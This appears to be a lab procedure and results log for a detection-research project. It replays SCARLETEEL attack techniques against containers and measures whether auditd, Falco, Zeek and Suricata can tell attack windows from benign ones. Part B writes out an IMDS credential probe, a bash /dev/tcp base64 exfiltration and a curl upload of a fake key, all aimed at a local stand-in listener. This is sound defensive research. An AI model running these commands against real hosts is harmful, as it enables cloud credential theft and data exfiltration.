# Threat-Model Table — Method and Lab Increment (v0)

**Purpose.** Step-by-step procedure to build the §1 threat-model table (`2026-plan.md:16`) the honest way: *instantiate → instrument → observe → assert*. Produces two artifacts from one rig: (a) the table's *measured* sensor columns, (b) the first labeled LOTL trace — together satisfying the week-one increment (`2026-plan.md:199`) and the checklist item it serves (`phd-plan-2026-2028.md:162`).

**Status.** Canonical location: this repo (`docs/`). The planning repo holds a pointer stub — edit here, not there.

**Time-box.** Part A: 30–60 min (provisioned as code). Part B: 1 h. Part C: 2 h. Part D: 1 h.

---

## Part A — The instrument (one Linux VM, provisioned as code)

**Provision (choose one — both consume the same `lab/vm/user-data.yaml`):**

- **Cloud (primary):** follow `lab/vm/UP-CLOUD.md` — OCI Always Free / AWS free tier, Ubuntu 22.04, paste user-data at creation. ~10 min.
- **Local KVM (fallback):** `make lab-vm-up` (= `lab/vm/up-local.sh`: raw QEMU/KVM + Ubuntu cloud image + `qemu-img` overlay + `cloud-localds` seed; no libvirt, no root). ~10 min + image download.

The user-data installs the entire rig: Docker CE, auditd (rules persisted in `/etc/audit/rules.d/90-tracejoin.rules`, keys `tj-exec`/`tj-net`), Zeek (OBS `security:/zeek` repo), Suricata (OISF PPA), Falco (pinned .deb + `falcoctl driver install`, service enabled), benign-background cron (`/etc/cron.d/tracejoin-benign`), capture helpers (`tj-capture-start [iface]` / `tj-capture-stop`; Zeek logs under `/root/capture/zeek/`, Suricata at `/var/log/suricata/eve.json`), and holds the kernel (`apt-mark hold` — eBPF probes are kernel-sensitive). The rig records its own manifest in `/etc/tracejoin-rig` — copy it to `evidence/versions.txt` after provisioning.

**Verify before Part B:**

```bash
cloud-init status --wait      # must print "status: done"
cat /etc/tracejoin-rig        # version manifest
systemctl is-active falco auditd docker cron
auditctl -l | grep tj-        # the two rules are loaded
docker run --rm hello-world
tj-capture-start docker0 && sleep 5 && tj-capture-stop
```

**Reset discipline (the scientific part):** local KVM — `make lab-vm-snapshot` once after clean provisioning (`clean-rig`), then `make lab-vm-rollback` between scenario rounds so every run starts from an identical baseline. Cloud — terminate and relaunch with the same user-data (`make lab-vm-recreate`): reprovision-is-rollback; same input ⇒ same rig.

**Deferred to increment v1 (record as such, don't block):** Tetragon — Kubernetes-native; deploying it belongs to the kind-cluster step. Until then its column stays "unverified". Fast path if the rig has capacity: install `kind` on the VM, `helm install tetragon cilium/tetragon`, run the scenarios as pods.

**Manual install reference (fallback only — the scripts above are canonical):** Docker CE (docker.com repo) · auditd + the two rules · Falco deb + driver · Zeek (OBS repo, `zeek -i af_packet::<bridge>`) · Suricata (OISF PPA) on the same bridge. Find the bridge with `ip route | grep docker`.

**Measured topology fact (verified 2026-09-25, scenario 1):** containers carry no `169.254.0.0/16` route — IMDS/link-local traffic egresses the default route through `docker0` and **is** captured on the bridge (Zeek `conn`: `172.17.0.2:44988 → 169.254.169.254:80`). The earlier "may not traverse" assumption was wrong. Remaining simplification: container→host-internal traffic on other paths, and post-NAT egress, are not captured. This v0 measures *sensor behavior*, not full visibility — the kind testbed (Part E) fixes topology later.

---

## Part B — The three seed scenarios

All recreated **safely**: attacker endpoints are replaced by a local listener container. No real third-party exfil, ever, from this rig. Each scenario is a script `scenarios/tj-<n>-<technique>.sh` with: technique ID, corpus evidence line (which report, which section), `date -u +%FT%TZ` echoed before and after (poor-man's markers — the GUID harness is §3 stage 3, not yet).

**Listener (container B):**
```bash
docker run -d --name tj-listener --network bridge python:3-slim \
  python -m http.server 80
LISTENER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' tj-listener)
```

**Scenario 1 — T1552.005 (IMDS probe; SCARLETEEL 1.0, Sysdig Feb 2023):**
```bash
date -u +%FT%TZ
docker exec tj-victim bash -c \
  "curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/"
date -u +%FT%TZ
# On a non-AWS VM this times out — the observable IS the attempt (execve+argv, socket, flow).
# Optional emulation: serve 169.254.169.254 on the host lo and route to it — defer unless needed.
```
where `tj-victim` = `docker run -d --name tj-victim nginx` (shell via `docker exec` gives the web-server-container context).

**Scenario 2 — T1048.003 (base64-GET exfil via bash built-ins; SCARLETEEL 2.0, Sysdig Sep 2023):**
```bash
date -u +%FT%TZ
docker exec tj-victim bash -c '
  cat /etc/hostname /proc/self/cgroup > /tmp/$$ 2>/dev/null   # stand-in for stolen creds ($CSOF)
  SEND_B64_DATA=$(cat /tmp/$$ | base64 -w 0)
  rm -f /tmp/$$
  exec 3<>/dev/tcp/'"$LISTENER_IP"'/80
  printf "GET /in.php?base64=%s HTTP/1.1\r\nHost: listener\r\nConnection: close\r\n\r\n" "$SEND_B64_DATA" >&3
  cat <&3 > /dev/null
'
date -u +%FT%TZ
```
This is the report's `dload()` rebuilt: shell built-ins only — no curl/wget process event; the URI carries the payload.

**Scenario 3 — T1567.002 (exfil to legitimate paste service; SCARLETEEL 2.0):**
```bash
date -u +%FT%TZ
docker exec tj-victim bash -c \
  "echo 'AKIAFAKECREDENTIAL0000' > /tmp/creds.txt && curl -s --upload-file /tmp/creds.txt http://$LISTENER_IP:80/upload"
date -u +%FT%TZ
# Stand-in endpoint, NOT temp.sh. Upgrade for TLS/SNI visibility later: self-signed HTTPS listener.
```

---

## Part C — Observation protocol (paired windows)

Each scenario round produces a **paired observation** — an attack window **A** and a matched benign window **B** — from an identical baseline:

1. Roll back to `clean-rig` (`make lab-vm-stop && make lab-vm-rollback && make lab-vm-up && make lab-vm-wait`); start `setup-listener.sh`, `setup-imds-poller.sh` (legitimate credential-agent stand-in polling IMDS every 60 s — the production noise the vendor exclusion macros exist for), and `sudo tj-capture-start docker0`.
2. **Benign window first** — run the benign twin `tj-<n>-benign.sh` (same mechanics, legitimate payload): record `t_b0/t_b1`, then `bash collect-evidence.sh <n>-benign "$t_b0" "$t_b1" <technique>`.
3. **Attack window** — run `tj-<n>-….sh`: record `t0/t1`, then `bash collect-evidence.sh <n> "$t0" "$t1" <technique>`.
4. Same round, same capture session, duration-matched windows; benign precedes attack (no contamination). v0 = one replicate; verdicts are marked *preliminary* until replicated.

Evaluate **three arms separately**: **auditd** (host syscall), **Falco** (host runtime policy), **Zeek+Suricata** (network). Fill `evidence/scenario-<n>.md` with **actual lines, not impressions**:

| Sensor | Where to look | What to record |
|---|---|---|
| Falco | `journalctl -u falco-modern-bpf --since @<epoch>` (concrete unit — the `falco` alias does not resolve; journald rejects a trailing `Z`) | Rule name and fields (`container.name`, `evt.type`, `proc.cmdline`). Deployed ruleset = stable `falco-rules:3` (25 rules; the incubating container-IMDS rule is absent) — zero alerts is a legitimate cell |
| Tetragon | *(v1 — kind cluster)* `tetra getevents` filtered `process_exec`, `process_socket_connect` | Event types + fields per scenario |
| auditd | `ausearch -if /var/log/audit/audit.log -i -k tj-exec` / `-k tj-net` (date and time as two args, `LC_ALL=C.UTF-8`) | SYSCALL/EXECVE/SOCKADDR records; argv presence (curl vs none for scenario 2). Note: connect records carry the destination only — **no ephemeral source port** |
| Zeek | `conn.log`, `http.log` in the logging dir | `id.orig_h/resp_h`, `service`; for `http.log`: `uri` (scenario 2's >100-byte base64 URI), `method`, `user_agent` |
| Suricata | `jq '.event_type' /var/log/suricata/eve.json` logs | http/flow/alert events; `flow` records are teardown-timestamped — filter on `.flow.start`; note honestly if **nothing fires** — an NIDS seeing nothing IS a table cell |

Honesty rules: a sensor that sees nothing is recorded as "no event", not skipped. Any cell not filled by an actual run stays **unverified**.

---

## Part D — Table assembly

Target columns (`2026-plan.md:16` + provenance, updated for separability): **Technique | instantiation | host events needed | network events needed | Falco/Tetragon emitted (observability) | Zeek/Suricata emitted (observability) | separating predicate per arm (auditd / eBPF / net) | fires on benign? | Verdict | Gap assertion | Corpus evidence | Verified?** — emitted cells record observability; verdicts come only from the separability criterion below.

- **Verdict** ∈ {`covered-host-only`, `covered-network-only`, `covered-both`, `join-required`, `blind-both`} — `covered-both` records redundant coverage (host and network arms each separate independently); `blind-both` is a *result*, not a failure.
- **Separability criterion — verdicts are assigned by this, never by co-presence of events.** Arm *s* ∈ {auditd, Falco, Zeek+Suricata} **separates** iff a predicate over *s*'s emitted fields fires on the attack window and never on the matched benign window. Two tiers: (1) **novel literal** — a `(field, value)` pair present in attack events and absent from all benign events; (2) **novel combination** — a conjunction (≤3 literals) co-occurring in one attack event but never co-occurring in benign. If neither exists, the arm does not separate — an information-content fact about the telemetry, not a rule-writing failure. Decision matrix below.
- **Gap assertion = one conjunction sentence**: "<process predicate> AND <network predicate>". Examples:
  - Scenario 2: *"non-interactive bash with no TTY in a web-server container opened a flow whose HTTP request carries a >100-byte base64 URI"*
  - Scenario 3: *"a pod with no prior curl executions uploaded a local file to an external endpoint"*
- Rows citing `evidence/scenario-<n>.md`; re-run any scenario after changing a sensor's config before trusting its cell again.

Decision matrix:

| auditd separates? | Falco separates? | net separates? | Verdict |
|---|---|---|---|
| ✓ | — | — | `covered-host-only` |
| — | ✓ | — | `covered-host-only` (eBPF) |
| — | — | ✓ | `covered-network-only` |
| ✓ | | ✓ | `covered-both` |
| — | — | — | joined predicate separates → `join-required`; none → `blind-both` |

**Pre-registered predictions** (registered 2026-10-08, before any paired-window run; do not edit after runs — falsification is a result):

| Scenario | Without poller (lab-minimal) | With poller (realistic benign) |
|---|---|---|
| S1 IMDS | auditd separates (`sockaddr=169.254.169.254`); net separates (`resp_h=169.254…`) → `covered-both`; Falco has no predicate (0 events) | auditd **cannot** separate (poller signature identical: `comm=curl`, `subj=docker-default`, same destination); net separates only via src-IP allowlist — the vendor `ec2_metadata_containers` pattern, fragile → `join-required` via container identity |
| S1v IMDS (argv-matched variant) | n/a — variation round | auditd **cannot** separate (actor argv/comm/subj/destination identical to poller — round-1's argv separator is erased); net separates **only** via the src-tuple allowlist → the robust separator is container identity, i.e. the join |
| PC (Falco positive control) | n/a — sensor health check, not a paired round | deployed rules *Terminal shell in container* (requires `proc.tty != 0`, hence `docker exec -it`) and *Read sensitive file untrusted* fire on `docker exec -it tj-victim sh -c 'cat /etc/shadow'`; if they fire, the zero column of the measured rounds is attributable to ruleset content, not sensor failure |
| S-pivot (lateral movement, T1021-class) | n/a — graph-novelty round | benign graph measured at **exactly two edges** (victim→listener, poller→IMDS; zero victim→poller across all four benign windows); the attack creates the **first-ever victim↔poller edge**. Single arms separate only via destination literals (attacker-chosen target) or the composite tuple — an IP-pair allowlist; the identity-pair graph predicate fires on the edge. Benign window reuses `tj-1-benign.sh` (mechanics matched; only the destination differs) |
| S2 bash exfil | host: novel combination `comm=bash ∧ connect ∧ no execve(curl)`; net: `uri` length/entropy → `covered-both` | unchanged |
| S3 upload | host: argv literal `--upload-file`; net: `method=PUT` → `covered-both` | unchanged |
| Rows 7/8/10/11 | expected genuine `join-required` (both sides individually ambiguous) — v1 | — |

### Erratum — S2 Falco cell (recorded 2026-10-16)

The S2 round's Falco "0 events" is a **collection artifact, not a measurement**.
S2's window was sub-second (`t0 = t1 = 2026-10-08T21:21:23Z`); the collector queried
`journalctl --since @T0 --until @T1`, and `--until @<epoch>` ends at `.000` of that
second, so the query covered an empty interval (`raw/falco.json` is empty). An
**unpaired diagnostic** re-run of `tj-2-t1048.003-bash-tcp-exfil.sh` on the same rig
(2026-10-16T16:36:37Z, stock ruleset, `falcoctl` follow disabled — same
`falco-rules:3` artifact as the original round) produced two deployed-rule alerts:
*Redirect stdout/stdin to network connection* (Notice, `evt_type=dup2`,
`connection=172.17.0.2:35042->172.17.0.3:80`, `process=bash`,
`container_name=tj-victim`) — one for `printf … >&3` (bash dup2s the socket onto
fd 1) and one for the `cat <&3` child (fd 0). The earlier explanation "fd 3 evades
the fd 0/1/2 rule" is therefore wrong: bash's redirection moves the socket onto
standard descriptors itself. Rounds with the same zero-length window: S3 (cell
unverified; curl does not dup a socket onto stdio) and S-pivot (zero independently
confirmed against the full journal of that session). S1/S1v had multi-second
windows and are unaffected. The diagnostic run does not fill the cell; the paired
replay below does.

### Protocol amendments (registered 2026-10-16, before the replay session)

1. **Host-window padding:** auditd and Falco queries use `[t0 − 1 s, t1 + 1 s]`
   (`HOST_PAD`, both windows of a pair). Padding can only add events to a window.
2. **Symmetric soak:** `sleep 25` after the benign twin **and** after the attack,
   before each collect (removes the `stype=flow` / poller-`sconn` artifacts of S1v,
   S2, S-pivot).
3. **Probe live:** `tools/ebpf/tj-probe.bt` (guest bpftrace 0.14) runs for the whole
   capture session; the collector windows its NDJSON with the net window into
   `raw/probe.window.ndjson` and records `probe.state` in `meta.json`. The probe is
   an IDS input, not a scored sensor arm; Falco stays on the stock ruleset (no local
   rules during measured rounds — `rule_matching: first` means any added connect
   rule would alter the Falco arm).
4. **Identity snapshot:** each collect records `raw/identity.ndjson`
   (`docker inspect`: name, id, image, IPs, network mode).

### S0 — join-key probe go/no-go (registered 2026-10-16, before the first probe run)

Data: every window of the replay session below (probe live). Definitions:
*container-originated* = `orig_h`/`saddr` ∈ 172.17.0.0/16 \ {172.17.0.1}, TCP only;
*comparison interval* = the window's net window minus 5 s at each edge.

| # | Criterion (all must hold for GO) |
|---|---|
| K1 | **Tuple completeness, 1:1.** In each window's comparison interval, the multiset of container-originated Zeek `conn` 4-tuples equals the multiset of probe `ev=connect` 4-tuples; each tuple occurs exactly once on each side |
| K2 | **Identity resolution.** Every container-originated probe `connect` carries `cg = docker-<id>.scope` whose id prefix equals the container id that `identity.ndjson` assigns to that source IP (100 %) |
| K3 | **Attack attribution.** In S1v's attack window, the tuple `172.17.0.2:<p> → 169.254.169.254:80` is present with tj-victim's `cg` and `comm=curl`; the poller's IMDS tuples carry tj-imds-poller's `cg` |

*Format clarification (2026-10-16, after the unscored smoke test, before any S0 data):*
the probe's `cg` field is the cgroup leaf truncated to 63 characters
(`docker-` + 56 hex, no `.scope` suffix); K2 is evaluated, as written, by id-prefix
match. The smoke test is not S0 evidence.

NO-GO on any criterion (counts reported; no threshold adjusted after seeing data) →
Phase 4 consumes Tetragon events (or a Falco catch-all rule in a separate,
non-measured cross-validation session); the join layer is unaffected. A probe that
fails to load on bpftrace 0.14 is a tooling defect (fixed and re-run, recorded), not
a kill.

### Replay predictions — replicate 2 (registered 2026-10-16, before the replay session)

S1, S1v, S-pivot, S2, S3 re-run as paired rounds under the amended protocol.

| Round | Prediction |
|---|---|
| S1, S1v, S-pivot, S3 | Verdict and separator classes replicate round 1 exactly (S1: auditd argv + net src-tuple; S1v: auditd does not separate, net src-tuple only; S-pivot: auditd destination literals, net composite tuple; S3: auditd `--upload-file`, net `PUT /upload`). Falco: 0 events in A and B |
| S2 | auditd and net replicate round 1; **Falco separates**: A contains ≥ 1 *Redirect stdout/stdin to network connection* alert (`evt_type=dup2`, `container_name=tj-victim`), B (curl twin) none. Verdict `covered-both` unchanged; Falco column becomes `sep`. *Disclosure: informed by the unpaired diagnostic run above — a replication target, not a blind prediction* |
| all | Under symmetric soak, the `stype=flow` and poller-`sconn` A-only literals are **absent**; if present, recorded as artifacts |

IDS-arm predictions for these windows (identity-keyed arm) are registered in a
separate commit before the IDS analysis is run.

### Results — replicate 2 (session 2026-10-16 19:40–19:58 UTC; recorded after the run)

Fresh rollback; probe live for the whole session (2052 lines, 0 non-JSON); pairs run
back-to-back with `tj-pair.sh` in the order 1v, 1, p, 2, 3. Scored with
`tools/separability.sh` (orientation fix below applied to both replicates) and
`tools/s0-check.sh`.

**Defects found while scoring (instrumentation, not measurements):**

1. **Late SLIRP RST.** Every unanswered SYN to 169.254.169.254 receives an RST from
   QEMU's user-mode network ~84 s later; Zeek logs it as a *new* conn record of the
   same tuple (`conn_state=RSTRH`, `history=^r`, `orig_pkts=0`), Suricata as a
   reversed `flow` record. 131 such records in the session; every one belongs to a
   tuple the probe attributes to an earlier connect.
2. **Cross-pair leakage** (back-to-back pairs; B's net window reaches 60 s into the
   past): `1-benign` contains the S1v attack's late RST (`172.17.0.2:42168 → IMDS`,
   attributed by the probe to the S1v attack: pid 2687, `curl`, tj-victim,
   19:50:09); `p-benign` contains the S1 attack's late RST; `3-benign` contains the
   S2 attack flow itself (`/in.php?base64=…`). `1v-benign` and `2-benign` are clean.
3. **Extractor orientation.** Suricata `fileinfo` events and RST-started `flow`
   records are server→client, so `sconn` carried the client's ephemeral port and
   every such record was a novel literal — contradicting the stated rule "ephemeral
   ports are never literals". Fixed by orienting `sconn` client→server when
   `src_port < 1024 ≤ dest_port`; replicate-1 verdicts unchanged (only the
   `sconn=…:<ephemeral>` literals disappear).

**Replay outcome vs prediction:**

| Round | Outcome | vs prediction |
|---|---|---|
| S1v | auditd does not separate; Falco 0; net only `conn=172.17.0.2->169.254.169.254:80` | **replicates** |
| S1 | auditd argv; Falco 0; net only via Suricata `sconn=172.17.0.2->169.254.169.254:80` — Zeek's `conn` literal is erased because B contains the leaked S1v late RST | auditd/Falco replicate; **net cell invalid** (contaminated B) → re-run |
| S-pivot | auditd destination literals; Falco 0; net `conn=172.17.0.2->172.17.0.4:80` (+ one leaked S1 late-RST literal) | **replicates** (B contaminated; separator unaffected) → re-run for a clean B |
| S2 | auditd as r1; **Falco separates** (2 × *Redirect stdout/stdin to network connection*, `dup2`, `container_name=tj-victim`, `connection=172.17.0.2:56146->172.17.0.3:80`); net `uri=/in.php?base64=…` | **confirmed** (Falco prediction; disclosed as informed by the diagnostic) |
| S3 | auditd `--upload-file`; **Falco 0 with the padded window** (resolves the unverified r1 cell); net `PUT /upload` | **replicates** (B contaminated by the S2 flow; separators unaffected) → re-run for a clean B |
| all | no `stype=flow` / poller-`sconn` soak artifacts | **confirmed** (symmetric soak works) |

**S0 outcome (criteria as registered):**

| # | Result |
|---|---|
| K1 | **FAIL as registered** in all 10 windows. Every Zeek-only tuple (10–13 per window) is a late-RST record (`history=^r`, `orig_pkts=0`: no connect occurred in the interval); every probe-only tuple (exactly 1 per window) is the poller's last connect 2–6 s before collection, not yet logged by Zeek (the interval's effective right edge is the collect time, not `net_end − 5 s`). Session-level decomposition: 147 Zeek SYN-bearing records ↔ 155 probe connects; **every SYN-bearing record has its probe connect, every probe connect older than the last snapshot has its Zeek record, 0 duplicates**; the 8 surplus probe connects post-date Zeek's last snapshot |
| K2 | **PASS** — 10/10 windows, every container-originated connect's `cg` resolves to the `identity.ndjson` container of its source IP |
| K3 | **PASS** — S1v attack tuple `172.17.0.2:42168 → 169.254.169.254:80`: `comm=curl`, `cg` = tj-victim; poller IMDS tuples carry tj-imds-poller's `cg` |

Reading: K1 failed on a specification error — the reference sensor (Zeek) emits
conn records that correspond to no connect, and the comparison interval ignored
collect-time truncation — not on a probe defect: the failure mode K1 exists to detect
(missed or spurious connects) occurred 0 times. Under the registered rule no
threshold is adjusted after seeing data, so **S0 is not declared GO on this
session**; an amended K1′ is registered below and evaluated prospectively on the
next session. Side result for F2: in this very session the probe resolved a flow
that flow-log keying misattributes — Zeek shows `tj-victim → IMDS` inside a benign
window (late RST), the probe shows no such connect there. An IP-keyed learner
training on that window would learn `tj-victim → IMDS` as benign.

Superseded expectation, kept for the record: the original guess that scenario 1 would be `covered-host-only` via a default Falco IMDS rule was **falsified** on 2026-09-25 — the deployed stable ruleset contains no IMDS rule, and the link-local flow *does* traverse `docker0`. Execution plan and decision log: [`CHECKPOINT.md`](../CHECKPOINT.md).

---

## Part E — Scope guard and upgrade path

**What this v0 is NOT** (do not gold-plate): not testbed-as-code (no pinned kernel/images, no `make lab-up`), no GUID label markers, no CI, no scaled benign corpus. Those are `2026-plan.md` §3 stages 1–5 and §6 — they consume this rig's outputs, not replace them.

**Upgrade path (each step = one §3 stage):**

| Step | Replaces | Keyed to |
|---|---|---|
| VM + manual scripts | — | this doc (week 1) |
| kind cluster, versions pinned, scenarios as YAML manifests | docker-run scripts | §3 stage 1–2 |
| `make lab-up` one-command rebuild | manual setup | §3 stage 1 |
| GUID marker harness (marker binary + marker hostname) | `date -u` echoes | §3 stage 3 |
| CI smoke (eBPF build + one scenario) | manual re-runs | repo strategy, CI from week 3 |

**Deliverables of the increment** (check against `2026-plan.md:199`): one VM ✓, two-to-three atomics ✓, auditd + one eBPF sensor (Falco; Tetragon in v1) ✓, marker mechanism (timestamps; GUID in v1) ✓, label-join script — minimal version: an `awk`/`jq` pass that extracts each scenario's events from all five logs into one per-scenario evidence file, keyed by the timestamp window. That file is the first labeled LOTL trace.
